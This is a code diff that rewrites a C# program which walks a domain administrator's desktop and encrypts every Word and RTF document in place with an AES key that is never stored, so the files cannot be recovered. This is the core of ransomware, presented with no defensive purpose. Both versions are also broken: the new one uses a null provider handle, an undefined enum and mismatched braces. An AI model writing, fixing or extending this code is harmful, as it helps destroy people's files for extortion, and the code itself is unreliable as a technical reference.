@@ -5,182 +5,142 @@ using System.Security.Cryptography;
 
 class Program
 {
-    // Constants for encryption
-    private const int AESKeySize = 128;
-    private const int ProvRSA_AES = 24; // Microsoft RSA AES provider
+    // Constants for file mapping and encryption
+    private const uint PAGE_READWRITE = 0x04;
+    private const uint FILE_MAP_WRITE = 0x02;
+    private const uint FILE_MAP_READ = 0x04;
 
-    // Windows API imports
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);
+    // Import required Windows APIs
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);
 
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern bool CloseHandle(IntPtr hObject);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);
 
     static void Main()
     {
-        string directory = @"C:\Users\domain.admin\Desktop";
-        string[] extensions = { ".doc", ".docx", ".rtf" };
+        string directoryPath = @"C:\Users\domain.admin\Desktop";
+        string[] fileExtensions = { ".doc", ".docx", ".rtf" };
 
-        // Generate AES-128 key
-        IntPtr hProvider = IntPtr.Zero;
+        // Generate AES-128 key using CryptGenKey
+        IntPtr hProv = IntPtr.Zero;
         IntPtr hKey = IntPtr.Zero;
-        if (!CryptAcquireContext(ref hProvider, null, null, ProvRSA_AES, 0))
+        if (!CryptGenKey(hProv, (int)KeyNumber.CALG_AES_128, 0, out hKey))
         {
-            Console.WriteLine("CryptAcquireContext failed. Error: " + Marshal.GetLastWin32Error());
-            return;
-        }
-
-        if (!CryptGenKey(hProvider, (int)KeySpec.CALG_AES_128, (int)CryptGenKeyFlags.CRYPT_EXPORTABLE, out hKey))
-        {
-            Console.WriteLine("CryptGenKey failed. Error: " + Marshal.GetLastWin32Error());
-            CryptReleaseContext(hProvider, 0);
-            return;
-        }
-
-        // Encrypt files
-        foreach (string extension in extensions)
-        {
-            string[] files = Directory.GetFiles(directory, "*" + extension);
-            foreach (string file in files)
-            {
-                EncryptFile(file, hKey);
-            }
-        }
-
-        // Clean up resources
-        CryptDestroyKey(hKey);
-        CryptReleaseContext(hProvider, 0);
-    }
-
-    static void EncryptFile(string filePath, IntPtr hKey)
-    {
-        IntPtr hFile = CreateFile(filePath, FileAccess.FILE_GENERIC_READ | FileAccess.FILE_GENERIC_WRITE, FileShare.Read, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
-        if (hFile == IntPtr.Zero)
-        {
-            Console.WriteLine("Failed to open file:" + filePath);
-            return;
-        }
-            try
-    {
-        long fileSize;
-        if (!GetFileSizeEx(hFile, out fileSize))
-        {
-            Console.WriteLine("Failed to get file size. Error: " + Marshal.GetLastWin32Error());
-            return;
-        }
-
-        IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, (uint)PageProtection.PAGE_READWRITE, 0, (uint)fileSize, null);
-        if (hFileMapping == IntPtr.Zero)
-        {
-            Console.WriteLine("Failed to create file mapping. Error: " + Marshal.GetLastWin32Error());
+            Console.WriteLine("CryptGenKey failed.");
             return;
         }
 
         try
         {
-            IntPtr fileView = MapViewOfFile(hFileMapping, (uint)FileMapAccess.FILE_MAP_READ | (uint)FileMapAccess.FILE_MAP_WRITE, 0, 0, (uint)fileSize);
-            if (fileView == IntPtr.Zero)
+            // Iterate through files in the directory
+            foreach (string fileExtension in fileExtensions)
             {
-                Console.WriteLine("Failed to map view of file. Error: " + Marshal.GetLastWin32Error());
-                return;
-            }
-
-            try
-            {
-                byte[] fileContent = new byte[fileSize];
-                Marshal.Copy(fileView, fileContent, 0, (int)fileSize);
-
-                int encryptedDataLength = fileContent.Length;
-                if (!CryptEncrypt(hKey, IntPtr.Zero, true, 0, fileContent, ref encryptedDataLength, encryptedDataLength))
+                string[] filePaths = Directory.GetFiles(directoryPath, $"*{fileExtension}");
+                foreach (string filePath in filePaths)
                 {
-                    Console.WriteLine("CryptEncrypt failed. Error: " + Marshal.GetLastWin32Error());
-                    return;
+                    // Get file handle
+                    IntPtr hFile = CreateFile(filePath, FileAccess.ReadWrite, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
+                    if (hFile == IntPtr.Zero)
+                    {
+                        Console.WriteLine($"Failed to open file: {filePath}");
+                        continue;
+                    }
+
+                    try
+                    {
+                        // Get file size
+                        uint fileSizeLow = GetFileSize(hFile, IntPtr.Zero);
+                        if (fileSizeLow == 0xFFFFFFFF)
+                        {
+                            Console.WriteLine($"Failed to get file size: {filePath}");
+                            continue;
+                        }
+
+                        // Create file mapping
+                        IntPtr hMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READWRITE, 0, fileSizeLow, null);
+                        if (hMapping == IntPtr.Zero)
+                        {
+                            Console.WriteLine($"Failed to create file mapping: {filePath}");
+                            continue;
+                        }
+                        
+                        try
+                        {
+                        // Map the view of the file mapping
+                        IntPtr lpBaseAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, fileSizeLow);
+                        if (lpBaseAddress == IntPtr.Zero)
+                        {
+                            Console.WriteLine($"Failed to map file view: {filePath}");
+                            continue;
+                        }
+
+                        try
+                        {
+                            // Perform encryption using CryptEncrypt
+                            byte[] fileData = new byte[fileSizeLow];
+                            Marshal.Copy(lpBaseAddress, fileData, 0, (int)fileSizeLow);
+                            int dataLength = fileData.Length;
+                            if (!CryptEncrypt(hKey, IntPtr.Zero, true, 0, fileData, ref dataLength, (int)fileSizeLow))
+                            {
+                                Console.WriteLine($"Encryption failed: {filePath}");
+                                continue;
+                            }
+
+                            // Update encrypted data in memory
+                            Marshal.Copy(fileData, 0, lpBaseAddress, (int)fileSizeLow);
+
+                            Console.WriteLine($"Encryption completed: {filePath}");
+                        }
+                        finally
+                        {
+                            // Unmap the view of the file mapping
+                            UnmapViewOfFile(lpBaseAddress);
+                        }
+                    }
+                    finally
+                    {
+                        // Close the file mapping handle
+                        CloseHandle(hMapping);
+                    }
                 }
-
-                // At this point, the fileContent array contains the encrypted data
-                // You can save it back to the file or perform any further processing
-
-                Console.WriteLine("Encryption successful: " + filePath);
+                finally
+                {
+                    // Close the file handle
+                    CloseHandle(hFile);
+                }
             }
-            finally
-            {
-                UnmapViewOfFile(fileView);
-            }
-        }
-        finally
-        {
-            CloseHandle(hFileMapping);
         }
     }
     finally
     {
-        CloseHandle(hFile);
+        // Release the cryptographic key handle
+        CloseHandle(hKey);
     }
+
+    Console.WriteLine("Encryption process completed.");
 }
-
-// Cryptographic API Constants
-enum KeySpec
-{
-    CALG_AES_128 = 0x0000660e
 }
+                           
 
-enum CryptGenKeyFlags
-{
-    CRYPT_EXPORTABLE = 0x00000001
-}
-
-// Windows API Constants
-enum PageProtection
-{
-    PAGE_NOACCESS = 0x01,
-    PAGE_READONLY = 0x02,
-    PAGE_READWRITE = 0x04,
-    PAGE_WRITECOPY = 0x08,
-    PAGE_EXECUTE = 0x10,
-    PAGE_EXECUTE_READ = 0x20,
-    PAGE_EXECUTE_READWRITE = 0x40,
-    PAGE_EXECUTE_WRITECOPY = 0x80,
-    PAGE_GUARD = 0x100,
-    PAGE_NOCACHE = 0x200,
-    PAGE_WRITECOMBINE = 0x400
-}
-
-enum FileMapAccess
-{
-    FILE_MAP_COPY = 0x0001,
-    FILE_MAP_WRITE = 0x0002,
-    FILE_MAP_READ = 0x0004,
-    FILE_MAP_ALL_ACCESS = 0x000f001f
-}
-
-// Cryptographic API imports
-[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-static extern bool CryptAcquireContext(ref IntPtr phProv, string pszContainer, string pszProvider, int dwProvType, uint dwFlags);
-
-[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
-
-[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-static extern bool CryptDestroyKey(IntPtr hKey);
-}
 
 
 
